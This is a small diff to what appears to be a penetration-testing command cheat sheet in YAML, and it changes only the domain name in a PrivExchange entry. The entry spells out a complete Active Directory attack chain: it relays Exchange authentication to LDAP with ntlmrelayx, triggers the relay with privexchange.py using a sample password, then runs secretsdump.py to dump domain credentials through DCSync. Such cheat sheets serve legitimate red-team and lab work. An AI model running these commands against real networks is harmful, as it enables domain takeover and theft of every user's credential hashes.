@@ -6,10 +6,10 @@ commands:
     cmd: |
       # PrivExchange — relay Exchange auth to LDAP for DCSync rights
       ntlmrelayx.py -t ldap://10.10.10.27 --escalate-user sec_user
-      python3 privexchange.py -ah 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.sh exchange.senshu.sh
+      python3 privexchange.py -ah 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.local exchange.senshu.local
 
       # After relay succeeds — DCSync
-      secretsdump.py senshu.sh/sec_user:'P@ssw0rd'@10.10.10.27
+      secretsdump.py senshu.local/sec_user:'P@ssw0rd'@10.10.10.27
 phase:
   - Exploitation
 target_os:
